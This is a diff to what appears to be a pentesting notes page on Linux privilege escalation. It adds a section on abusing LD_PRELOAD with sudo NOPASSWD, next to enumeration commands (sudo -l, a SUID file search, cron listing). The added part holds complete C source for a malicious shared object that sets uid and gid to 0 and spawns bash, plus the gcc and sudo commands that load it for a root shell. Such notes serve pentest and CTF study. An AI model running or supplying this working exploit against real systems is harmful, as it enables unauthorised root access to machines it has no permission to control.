@@ -39,11 +39,44 @@ cat /etc/cron.d/
 
 Run all of these commands then check [https://gtfobins.github.io/](https://gtfobins.github.io/) . They may give different results
 
-**Files with SUID-bit set**
+### **Check what can be run with NOPASSWD**
 
 ```
 sudo -l
 ```
+
+#### **LD\_PRELOAD**
+
+If LD\_PRELOAD is set try below then running the script we can run with NOPASSWD
+
+```
+vi preload.c
+```
+
+<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+**preload.c - code**
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+ unsetenv("LD_PRELOAD");
+ setgid(0);
+ setuid(0);
+ system("/bin/bash");
+}
+```
+
+
+
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
+sudo LD_PRELOAD=/tmp/preload.so $NOPASSWD_SCRIPT_WE_CAN_ABUSE
+```
+
+### **Files with SUID-bit set**
 
 ```
 find / -perm -u=s -type f 2> /dev/null 
